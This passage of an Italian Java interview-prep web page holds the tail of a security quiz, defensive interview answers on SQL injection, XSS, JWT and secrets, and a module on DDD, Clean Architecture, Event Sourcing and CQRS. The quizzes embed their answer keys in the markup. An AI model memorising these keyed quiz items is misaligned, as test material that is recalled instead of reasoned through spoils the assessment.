                            <input type="radio" name="q47" id="q47b" value="b">
                            <label for="q47b">Implementa una blacklist di token revocati</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q47" id="q47c" value="c">
                            <label for="q47c">Aspetta che scada naturalmente</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q47" id="q47d" value="d">
                            <label for="q47d">I JWT non possono essere rubati se firmati</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q47')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q47"></div>
                </div>

                <!-- Question 48 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Un form permette agli utenti di inserire una bio. Come previeni Stored XSS?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q48" id="q48a" value="a">
                            <label for="q48a">Escape dell'output HTML quando renderizzi la bio</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q48" id="q48b" value="b">
                            <label for="q48b">Validazione input: rifiuta qualsiasi carattere speciale</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q48" id="q48c" value="c">
                            <label for="q48c">Usa HTTPS per cifrare i dati</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q48" id="q48d" value="d">
                            <label for="q48d">Implementa rate limiting sul form</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q48')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q48"></div>
                </div>

                <!-- Question 49 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> La tua API REST stateless usa JWT in Authorization header. Devi implementare protezione CSRF?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q49" id="q49a" value="a">
                            <label for="q49a">Sì, CSRF è sempre necessario per le API</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q49" id="q49b" value="b">
                            <label for="q49b">Sì, perché JWT può essere rubato con CSRF</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q49" id="q49c" value="c">
                            <label for="q49c">Solo se l'API è accessibile da browser</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q49" id="q49d" value="d">
                            <label for="q49d">No, CSRF sfrutta i cookie automatici. Authorization header non è automatico</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q49')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q49"></div>
                </div>

                <!-- Question 50 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Quale algoritmo di hashing password è raccomandato nel 2026?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q50" id="q50a" value="a">
                            <label for="q50a">SHA-256 con salt random</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q50" id="q50b" value="b">
                            <label for="q50b">MD5 con HMAC</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q50" id="q50c" value="c">
                            <label for="q50c">BCrypt, Argon2, o scrypt (adaptive hashing)</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q50" id="q50d" value="d">
                            <label for="q50d">AES-256 encryption</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q50')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q50"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 10 -->
            <section class="section" id="modulo10-questions">
                <h2>Domande da Colloquio - Modulo 10</h2>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra autenticazione e autorizzazione.</h4>
                    <p><strong>Risposta attesa:</strong> L'autenticazione verifica CHI sei (identità): username/password, token, certificato. L'autorizzazione verifica COSA puoi fare (permessi): una volta autenticato, quali risorse puoi accedere? Esempio: login con credenziali = autenticazione. Controllo se puoi eliminare un utente = autorizzazione. Spring Security li separa: AuthenticationManager per autenticazione, AccessDecisionManager per autorizzazione. HTTP status: 401 = non autenticato, 403 = autenticato ma non autorizzato.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come preveniresti SQL Injection in un'applicazione Java?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Prepared Statements con parametri bind: <code>PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); ps.setInt(1, userId);</code>. Il database tratta il parametro come dato, mai come codice. 2) Con JPA/Hibernate: named parameters <code>@Query("SELECT u FROM User u WHERE u.id = :id")</code>. 3) Validazione input come layer aggiuntivo (whitelist, type checking). 4) Principle of least privilege: l'utente DB ha solo i permessi necessari. MAI concatenare stringhe per costruire query.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Session vs JWT: quali sono i trade-off?</h4>
                    <p><strong>Risposta attesa:</strong> Session: Pro - revoca istantanea (cancella session), HttpOnly cookie sicuro contro XSS. Contro - richiede session store condiviso (Redis) per scaling, sticky sessions o distributed cache. JWT: Pro - stateless, nessun lookup DB, scala orizzontalmente, ottimo per microservizi e cross-domain. Contro - no revoca istantanea (devi implementare blacklist), payload size maggiore, se rubato è valido fino a scadenza. Scelta: monolite con session, microservizi con JWT. Ibrido: JWT per access (short-lived), session/cookie per refresh (revocabile).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestiresti i secrets in un ambiente Kubernetes?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Kubernetes Secrets base: meglio di hardcoded ma sono solo base64 encoded, non encrypted. 2) Sealed Secrets (Bitnami): encrypted con chiave del cluster, safe to commit. 3) External Secrets Operator: sincronizza da AWS Secrets Manager, Vault, etc. 4) HashiCorp Vault con injector sidecar: secrets iniettati come file o env vars. 5) SOPS per encryption at rest dei secret files. Best practice: secrets come env vars (non file), rotation automatica, audit logging, least privilege access. Mai loggare secrets.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Cosa sono e come previeni XSS?</h4>
                    <p><strong>Risposta attesa:</strong> XSS (Cross-Site Scripting): l'attacker inietta script malevolo che viene eseguito nel browser della vittima. Tipi: Stored (script salvato in DB), Reflected (script nell'URL riflesso nella risposta), DOM-based (manipolazione DOM client-side). Prevenzione: 1) Output encoding/escaping: tutto l'output user-generated deve essere escaped per il contesto (HTML, JS, URL). 2) Content Security Policy (CSP): header che blocca inline scripts. 3) HttpOnly cookies: JS non può accedere ai cookie di sessione. 4) Validazione input (whitelist). In Spring: Thymeleaf usa th:text (escaped) di default, evitare th:utext.</p>
                </div>
            </section>

            <!-- ==================== MODULO 11: DDD & CLEAN ARCHITECTURE ==================== -->

            <header class="module-header" id="modulo11">
                <span class="module-tag">Modulo 11</span>
                <h1>DDD & Clean Architecture</h1>
                <p>Domain Driven Design, Hexagonal Architecture, Event Sourcing e CQRS</p>
            </header>

            <!-- DDD Section -->
            <section class="section" id="modulo11-ddd">
                <h2>Domain Driven Design (DDD)</h2>

                <p><strong>Domain Driven Design</strong> è un approccio allo sviluppo software che mette il dominio di business al centro dell'architettura. Invece di partire dal database o dall'UI, parti dalla comprensione profonda del problema di business.</p>

                <h3>Ubiquitous Language</h3>

                <p>Il <strong>Ubiquitous Language</strong> è un linguaggio condiviso tra sviluppatori e domain experts. Ogni termine ha un significato preciso usato ovunque: codice, documentazione, conversazioni.</p>

                <pre><code class="language-java">// ❌ SENZA Ubiquitous Language
class DataProcessor {
    void processItem(Item item, int statusCode) {
        if (statusCode == 1) { ... }  // Cosa significa 1?
    }
}

// ✅ CON Ubiquitous Language
class OrderService {
    void shipOrder(Order order) {
        order.markAsShipped();  // Linguaggio del dominio
    }
}

enum OrderStatus {
    PENDING_PAYMENT,
    PAYMENT_CONFIRMED,
    SHIPPED,
    DELIVERED,
    CANCELLED
}</code></pre>

                <h3>Bounded Contexts</h3>

                <p>Un <strong>Bounded Context</strong> è un confine esplicito dentro il quale un modello di dominio è valido. Lo stesso termine può avere significati diversi in contesti diversi.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        BOUNDED CONTEXTS - E-Commerce                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────┐    ┌─────────────────────┐    ┌─────────────────┐ │
│  │   SALES CONTEXT     │    │  INVENTORY CONTEXT  │    │ SHIPPING CONTEXT│ │
│  │                     │    │                     │    │                 │ │
│  │  "Product" =        │    │  "Product" =        │    │  "Product" =    │ │
│  │   - name            │    │   - SKU             │    │   - weight      │ │
│  │   - price           │    │   - quantity        │    │   - dimensions  │ │
│  │   - description     │    │   - warehouse       │    │   - fragile     │ │
│  │   - images          │    │   - reorderLevel    │    │                 │ │
│  │                     │    │                     │    │                 │ │
│  │  "Customer" =       │    │  (no Customer)      │    │  "Customer" =   │ │
│  │   - name            │    │                     │    │   - address     │ │
│  │   - email           │    │                     │    │   - phone       │ │
│  │   - preferences     │    │                     │    │                 │ │
│  └──────────┬──────────┘    └──────────┬──────────┘    └────────┬────────┘ │
│             │                          │                        │          │
│             └──────────────────────────┼────────────────────────┘          │
│                          Context Mapping (Integration)                      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Building Blocks del DDD</h3>

                <h4>Entity vs Value Object</h4>

                <pre><code class="language-java">// ENTITY: ha identità, può cambiare stato
// Due ordini con stesso contenuto sono DIVERSI se hanno ID diverso
@Entity
public class Order {
    @Id
    private OrderId id;  // Identità
    private OrderStatus status;
    private List&lt;OrderLine&gt; lines;

    // Può cambiare stato
    public void addItem(Product product, int quantity) { ... }
    public void markAsShipped() { this.status = OrderStatus.SHIPPED; }

    // Uguaglianza basata su ID
    @Override
    public boolean equals(Object o) {
        return o instanceof Order other && this.id.equals(other.id);
    }
}

// VALUE OBJECT: immutabile, definito dai suoi attributi
// Due Money con stesso amount e currency sono UGUALI
public record Money(BigDecimal amount, Currency currency) {
    public Money {
        if (amount.compareTo(BigDecimal.ZERO) &lt; 0) {
            throw new IllegalArgumentException("Amount cannot be negative");
        }
    }

    public Money add(Money other) {
        if (!this.currency.equals(other.currency)) {
            throw new IllegalArgumentException("Cannot add different currencies");
        }
        return new Money(this.amount.add(other.amount), this.currency);
    }

    // Uguaglianza basata sui valori (automatico con record)
}

// Altro Value Object
public record Address(String street, String city, String zipCode, String country) {
    // Immutabile, uguaglianza per valore
}</code></pre>

                <h4>Aggregate e Aggregate Root</h4>

                <p>Un <strong>Aggregate</strong> è un cluster di oggetti trattati come unità per le modifiche. L'<strong>Aggregate Root</strong> è l'unico punto di accesso all'aggregate.</p>

                <pre><code class="language-java">// Order è l'Aggregate Root
// OrderLine esiste solo dentro Order
public class Order {  // Aggregate Root
    private OrderId id;
    private CustomerId customerId;
    private List&lt;OrderLine&gt; lines = new ArrayList&lt;&gt;();  // Parte dell'aggregate
    private Money total;

    // ✅ Le modifiche passano SEMPRE dall'Aggregate Root
    public void addItem(ProductId productId, int quantity, Money price) {
        // Invarianti di business qui
        if (this.status != OrderStatus.DRAFT) {
            throw new IllegalStateException("Cannot modify non-draft order");
        }

        var existingLine = findLine(productId);
        if (existingLine.isPresent()) {
            existingLine.get().increaseQuantity(quantity);
        } else {
            lines.add(new OrderLine(productId, quantity, price));
        }

        recalculateTotal();
    }

    // ❌ MAI esporre la lista interna
    // public List&lt;OrderLine&gt; getLines() { return lines; }

    // ✅ Esponi una vista immutabile
    public List&lt;OrderLine&gt; getLines() {
        return Collections.unmodifiableList(lines);
    }
}

// OrderLine NON è accessibile direttamente dall'esterno
class OrderLine {  // Parte dell'aggregate, NON root
    private ProductId productId;
    private int quantity;
    private Money unitPrice;

    void increaseQuantity(int amount) {
        this.quantity += amount;
    }
}</code></pre>

                <h4>Repository Pattern</h4>

                <pre><code class="language-java">// Repository: astrazione per persistenza degli Aggregate
public interface OrderRepository {
    Order findById(OrderId id);
    void save(Order order);
    void delete(OrderId id);

    // Query specifiche del dominio
    List&lt;Order&gt; findByCustomer(CustomerId customerId);
    List&lt;Order&gt; findPendingOrdersOlderThan(Duration duration);
}

// Implementazione con JPA
@Repository
class JpaOrderRepository implements OrderRepository {
    private final OrderJpaRepository jpaRepo;
    private final OrderMapper mapper;

    @Override
    public Order findById(OrderId id) {
        return jpaRepo.findById(id.value())
            .map(mapper::toDomain)
            .orElseThrow(() -> new OrderNotFoundException(id));
    }

    @Override
    public void save(Order order) {
        var entity = mapper.toEntity(order);
        jpaRepo.save(entity);
    }
}</code></pre>

                <h4>Domain Events</h4>

                <pre><code class="language-java">// Domain Event: qualcosa di importante che è successo nel dominio
public record OrderPlaced(
    OrderId orderId,
    CustomerId customerId,
    Money total,
    Instant occurredAt
) implements DomainEvent {}

public record OrderShipped(
    OrderId orderId,
    TrackingNumber trackingNumber,
    Instant occurredAt
) implements DomainEvent {}

// L'Aggregate Root pubblica eventi
public class Order {
    private List&lt;DomainEvent&gt; domainEvents = new ArrayList&lt;&gt;();

    public void place() {
        if (lines.isEmpty()) {
            throw new IllegalStateException("Cannot place empty order");
        }
        this.status = OrderStatus.PLACED;
        domainEvents.add(new OrderPlaced(id, customerId, total, Instant.now()));
    }

    public List&lt;DomainEvent&gt; getDomainEvents() {
        return List.copyOf(domainEvents);
    }

    public void clearDomainEvents() {
        domainEvents.clear();
    }
}

// Event handler in altro bounded context
@Component
class InventoryEventHandler {
    @EventListener
    public void on(OrderPlaced event) {
        // Riserva gli item in inventario
        inventoryService.reserveItems(event.orderId());
    }
}</code></pre>
            </section>

            <!-- Clean Architecture Section -->
            <section class="section" id="modulo11-clean">
                <h2>Clean Architecture & Hexagonal</h2>

                <p>La <strong>Clean Architecture</strong> (Uncle Bob) e l'<strong>Hexagonal Architecture</strong> (Ports & Adapters) condividono lo stesso principio: il dominio al centro, le dipendenze puntano verso l'interno.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        CLEAN ARCHITECTURE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│                    ┌─────────────────────────────────┐                      │
│                    │     FRAMEWORKS & DRIVERS        │  ← Web, DB, UI       │
│                    │     (Infrastructure)            │                      │
│                    │  ┌─────────────────────────┐    │                      │
│                    │  │   INTERFACE ADAPTERS    │    │  ← Controllers,      │
│                    │  │   (Adapters)            │    │    Gateways,         │
│                    │  │  ┌─────────────────┐    │    │    Presenters        │
│                    │  │  │   USE CASES     │    │    │                      │
│                    │  │  │  (Application)  │    │    │  ← Business rules    │
│                    │  │  │  ┌─────────┐    │    │    │                      │
│                    │  │  │  │ ENTITIES│    │    │    │  ← Enterprise        │
│                    │  │  │  │ (Domain)│    │    │    │    business rules    │
│                    │  │  │  └─────────┘    │    │    │                      │
│                    │  │  └─────────────────┘    │    │                      │
│                    │  └─────────────────────────┘    │                      │
│                    └─────────────────────────────────┘                      │
│                                                                              │
│  DEPENDENCY RULE: Le dipendenze puntano solo VERSO L'INTERNO               │
│  Il Domain non conosce Spring, JPA, HTTP, etc.                              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Hexagonal Architecture (Ports & Adapters)</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        HEXAGONAL ARCHITECTURE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│        DRIVING ADAPTERS                           DRIVEN ADAPTERS           │
│        (Input)                                    (Output)                  │
│                                                                              │
│  ┌─────────────┐       ┌─────────────────────┐       ┌─────────────┐       │
│  │ REST        │──────▶│     APPLICATION     │──────▶│ PostgreSQL  │       │
│  │ Controller  │       │                     │       │ Repository  │       │
│  └─────────────┘       │  ┌───────────────┐  │       └─────────────┘       │
│                        │  │               │  │                              │
│  ┌─────────────┐       │  │    DOMAIN     │  │       ┌─────────────┐       │
│  │ GraphQL     │──────▶│  │               │  │──────▶│ Kafka       │       │
│  │ Resolver    │       │  │   (Entities,  │  │       │ Publisher   │       │
│  └─────────────┘       │  │  Value Objects│  │       └─────────────┘       │
│                        │  │   Services)   │  │                              │
│  ┌─────────────┐       │  │               │  │       ┌─────────────┐       │
│  │ CLI         │──────▶│  └───────────────┘  │──────▶│ Email       │       │
│  │ Command     │       │                     │       │ Service     │       │
│  └─────────────┘       │  Uses Ports         │       └─────────────┘       │
│                        │  (interfaces)       │                              │
│        ▲               └─────────────────────┘               ▲              │
│        │                                                     │              │
│   INBOUND PORTS                                    OUTBOUND PORTS          │
│   (Use Cases)                                      (Repository,            │
│                                                    EventPublisher)         │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// ════════════════════════════════════════════════════════════════
// DOMAIN LAYER (centro - nessuna dipendenza esterna)
// ════════════════════════════════════════════════════════════════

// Entità di dominio pura
public class Order {
    private OrderId id;
    private List&lt;OrderLine&gt; lines;
    private OrderStatus status;

    public void place() { ... }
    public void ship(TrackingNumber tracking) { ... }
}

// ════════════════════════════════════════════════════════════════
// APPLICATION LAYER (Use Cases)
// ════════════════════════════════════════════════════════════════

// INBOUND PORT: definisce cosa l'applicazione può fare
public interface PlaceOrderUseCase {
    OrderId execute(PlaceOrderCommand command);
}

public record PlaceOrderCommand(
    CustomerId customerId,
    List&lt;OrderItemCommand&gt; items
) {}

// USE CASE implementation
@Service
@Transactional
public class PlaceOrderService implements PlaceOrderUseCase {
    private final OrderRepository orderRepository;      // Outbound port
    private final CustomerRepository customerRepository;
    private final EventPublisher eventPublisher;        // Outbound port

    @Override
    public OrderId execute(PlaceOrderCommand command) {
        Customer customer = customerRepository.findById(command.customerId())
            .orElseThrow(() -> new CustomerNotFoundException(command.customerId()));

        Order order = Order.create(customer.getId());
        command.items().forEach(item ->
            order.addItem(item.productId(), item.quantity(), item.price())
        );
        order.place();

        orderRepository.save(order);
        order.getDomainEvents().forEach(eventPublisher::publish);

        return order.getId();
    }
}

// OUTBOUND PORTS (interfaces definite nel domain/application layer)
public interface OrderRepository {
    Optional&lt;Order&gt; findById(OrderId id);
    void save(Order order);
}

public interface EventPublisher {
    void publish(DomainEvent event);
}

// ════════════════════════════════════════════════════════════════
// INFRASTRUCTURE LAYER (Adapters)
// ════════════════════════════════════════════════════════════════

// INBOUND ADAPTER: REST Controller
@RestController
@RequestMapping("/orders")
public class OrderController {
    private final PlaceOrderUseCase placeOrderUseCase;  // Dipende dal PORT

    @PostMapping
    public ResponseEntity&lt;OrderResponse&gt; placeOrder(@RequestBody PlaceOrderRequest request) {
        var command = new PlaceOrderCommand(
            new CustomerId(request.customerId()),
            request.items().stream().map(this::toCommand).toList()
        );
        OrderId orderId = placeOrderUseCase.execute(command);
        return ResponseEntity.created(URI.create("/orders/" + orderId)).build();
    }
}

// OUTBOUND ADAPTER: JPA Repository
@Repository
public class JpaOrderRepository implements OrderRepository {
    private final OrderJpaRepository jpaRepo;
    private final OrderMapper mapper;

    @Override
    public void save(Order order) {
        jpaRepo.save(mapper.toEntity(order));
    }
}

// OUTBOUND ADAPTER: Kafka Publisher
@Component
public class KafkaEventPublisher implements EventPublisher {
    private final KafkaTemplate&lt;String, Object&gt; kafka;

    @Override
    public void publish(DomainEvent event) {
        kafka.send("domain-events", event);
    }
}</code></pre>
            </section>

            <!-- CQRS & Event Sourcing Section -->
            <section class="section" id="modulo11-cqrs">
                <h2>Event Sourcing & CQRS</h2>

                <h3>Event Sourcing</h3>

                <p>In <strong>Event Sourcing</strong>, invece di salvare lo stato corrente, salvi la sequenza di eventi che hanno portato a quello stato. Lo stato è derivato riapplicando gli eventi.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        EVENT SOURCING                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  TRADITIONAL (State)              EVENT SOURCING                            │
│  ─────────────────────            ──────────────────                         │
│                                                                              │
│  Account Table:                   Event Store:                              │
│  ┌─────────────────┐              ┌──────────────────────────────────────┐  │
│  │ id: 123         │              │ 1. AccountCreated(id=123, name=John) │  │
│  │ balance: 150    │    vs        │ 2. MoneyDeposited(id=123, amount=200)│  │
│  │ name: John      │              │ 3. MoneyWithdrawn(id=123, amount=50) │  │
│  └─────────────────┘              └──────────────────────────────────────┘  │
│                                                                              │
│  "Cosa c'è adesso"                "Cosa è successo" → ricostruisci stato    │
│                                                                              │
│  Pro Event Sourcing:                                                        │
│  ✓ Audit trail completo (chi ha fatto cosa, quando)                        │
│  ✓ Time travel: ricostruisci stato a qualsiasi punto                       │
│  ✓ Debug: replay eventi per riprodurre bug                                 │
│  ✓ Event-driven architecture naturale                                       │
│                                                                              │
│  Contro:                                                                     │
│  ✗ Complessità (eventual consistency, versioning eventi)                   │
│  ✗ Query complesse richiedono proiezioni (→ CQRS)                          │
│  ✗ Curva di apprendimento                                                   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Aggregate con Event Sourcing
public class Account {
    private AccountId id;
    private String name;
    private Money balance;
    private List&lt;DomainEvent&gt; uncommittedEvents = new ArrayList&lt;&gt;();

    // Ricostruisci da eventi
    public static Account fromEvents(List&lt;DomainEvent&gt; events) {
        Account account = new Account();
        events.forEach(account::apply);
        return account;
    }

    // Comandi producono eventi
    public void deposit(Money amount) {
        if (amount.isNegative()) {
            throw new IllegalArgumentException("Amount must be positive");
        }
        applyAndRecord(new MoneyDeposited(id, amount, Instant.now()));
    }

    public void withdraw(Money amount) {
        if (balance.lessThan(amount)) {
            throw new InsufficientFundsException(id, balance, amount);
        }
        applyAndRecord(new MoneyWithdrawn(id, amount, Instant.now()));
    }

    // Applica evento allo stato
    private void apply(DomainEvent event) {
        switch (event) {
            case AccountCreated e -> {
                this.id = e.accountId();
                this.name = e.name();
                this.balance = Money.ZERO;
            }
            case MoneyDeposited e -> this.balance = balance.add(e.amount());
            case MoneyWithdrawn e -> this.balance = balance.subtract(e.amount());
            default -> throw new IllegalArgumentException("Unknown event: " + event);
        }
    }

    private void applyAndRecord(DomainEvent event) {
        apply(event);
        uncommittedEvents.add(event);
    }

    public List&lt;DomainEvent&gt; getUncommittedEvents() {
        return List.copyOf(uncommittedEvents);
    }
}</code></pre>

                <h3>CQRS (Command Query Responsibility Segregation)</h3>

                <p><strong>CQRS</strong> separa i modelli per scrittura (Command) e lettura (Query). Ogni lato può essere ottimizzato indipendentemente.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        CQRS PATTERN                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│                              ┌─────────┐                                    │
│                              │ Client  │                                    │
│                              └────┬────┘                                    │
│                         ┌─────────┴─────────┐                               │
│                         │                   │                               │
│                    Commands              Queries                            │
│                    (writes)              (reads)                            │
│                         │                   │                               │
│                         ▼                   ▼                               │
│               ┌─────────────────┐   ┌─────────────────┐                    │
│               │ Command Handler │   │  Query Handler  │                    │
│               │   (Use Cases)   │   │   (Read Model)  │                    │
│               └────────┬────────┘   └────────┬────────┘                    │
│                        │                     │                              │
│                        ▼                     ▼                              │
│               ┌─────────────────┐   ┌─────────────────┐                    │
│               │  Write Model    │   │   Read Model    │  ← Ottimizzato     │
│               │  (Domain/Event  │   │  (Proiezioni,   │    per query       │
│               │   Store)        │   │   denormalizzato)│                   │
│               └────────┬────────┘   └─────────────────┘                    │
│                        │                     ▲                              │
│                        │     Events          │                              │
│                        └─────────────────────┘                              │
│                          (Sincronizzazione)                                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// COMMAND SIDE
public record PlaceOrderCommand(CustomerId customerId, List&lt;Item&gt; items) {}

@Service
public class OrderCommandHandler {
    private final EventStore eventStore;

    public void handle(PlaceOrderCommand cmd) {
        Order order = Order.create(cmd.customerId());
        cmd.items().forEach(i -> order.addItem(i.productId(), i.quantity()));
        order.place();

        // Salva eventi, non stato
        eventStore.append(order.getId(), order.getUncommittedEvents());
    }
}

// QUERY SIDE - Read Model ottimizzato
@Document(collection = "order_summaries")
public class OrderSummaryReadModel {
    private String orderId;
    private String customerName;  // Denormalizzato!
    private BigDecimal total;
    private String status;
    private int itemCount;
    private Instant placedAt;
}

// Proiezione: ascolta eventi e aggiorna read model
@Component
public class OrderSummaryProjection {
    private final OrderSummaryRepository readRepo;
    private final CustomerRepository customerRepo;

    @EventListener
    public void on(OrderPlaced event) {
        Customer customer = customerRepo.findById(event.customerId());

        OrderSummaryReadModel summary = new OrderSummaryReadModel();
        summary.setOrderId(event.orderId().value());
        summary.setCustomerName(customer.getName());  // Denormalizza
        summary.setTotal(event.total().amount());
        summary.setStatus("PLACED");
        summary.setPlacedAt(event.occurredAt());

        readRepo.save(summary);
    }

    @EventListener
    public void on(OrderShipped event) {
        readRepo.updateStatus(event.orderId(), "SHIPPED");
    }
}

// Query handler: legge dal read model (veloce, ottimizzato)
@Service
public class OrderQueryHandler {
    private final OrderSummaryRepository readRepo;

    public List&lt;OrderSummaryReadModel&gt; getOrdersByCustomer(String customerName) {
        // Query diretta, no JOIN, denormalizzato
        return readRepo.findByCustomerName(customerName);
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>CQRS/Event Sourcing: Quando Usarli?</h4>
                    <p><strong>Usali quando</strong>: Domini complessi con regole di business ricche, audit trail è requisito, workload read/write molto diversi, team esperti. <strong>NON usarli per</strong>: CRUD semplice, team piccoli/inesperti, MVP. La complessità aggiunta deve essere giustificata dal valore di business.</p>
                </div>
            </section>

            <!-- Quiz Section Modulo 11 -->
            <section class="quiz-section" id="modulo11-quiz">
                <h2>Interactive Challenge Quiz - Modulo 11</h2>

                <!-- Question 51 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> In DDD, qual è la differenza principale tra Entity e Value Object?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q51" id="q51a" value="a">
                            <label for="q51a">Entity è mutabile, Value Object è immutabile</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q51" id="q51b" value="b">
                            <label for="q51b">Entity ha identità unica, Value Object è definito dai suoi attributi</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q51" id="q51c" value="c">
                            <label for="q51c">Entity è persistita in DB, Value Object no</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q51" id="q51d" value="d">
                            <label for="q51d">Entity ha metodi, Value Object ha solo dati</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q51')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q51"></div>
                </div>

                <!-- Question 52 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q2.</span> Perché le dipendenze in Clean Architecture puntano verso l'interno?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q52" id="q52a" value="a">
                            <label for="q52a">Per migliorare le performance del sistema</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q52" id="q52b" value="b">
                            <label for="q52b">Perché il database è il componente più importante</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q52" id="q52c" value="c">
                            <label for="q52c">Per proteggere il dominio da cambiamenti nei dettagli implementativi</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q52" id="q52d" value="d">
                            <label for="q52d">Per facilitare il deployment in microservizi</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q52')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q52"></div>
                </div>

                <!-- Question 53 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> In Event Sourcing, come ricostruisci lo stato corrente di un Aggregate?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q53" id="q53a" value="a">
                            <label for="q53a">Riapplichi tutti gli eventi dall'inizio in ordine cronologico</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q53" id="q53b" value="b">
                            <label for="q53b">Leggi l'ultimo snapshot dal database</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q53" id="q53c" value="c">
                            <label for="q53c">Fai una query SQL con i filtri appropriati</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q53" id="q53d" value="d">
                            <label for="q53d">Deserializzi il JSON salvato nell'event store</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q53')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q53"></div>
                </div>

                <!-- Question 54 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> In CQRS, perché il Read Model può essere denormalizzato?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q54" id="q54a" value="a">
                            <label for="q54a">Perché i dati sono di sola lettura, non serve integrità referenziale</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q54" id="q54b" value="b">
                            <label for="q54b">Perché le query sono meno importanti dei comandi</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q54" id="q54c" value="c">
                            <label for="q54c">Perché MongoDB non supporta normalizzazione</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q54" id="q54d" value="d">
                            <label for="q54d">Perché è separato dal Write Model e può essere ottimizzato per le query specifiche</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q54')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q54"></div>
                </div>

                <!-- Question 55 -->
                <div class="quiz-question" data-correct="b">
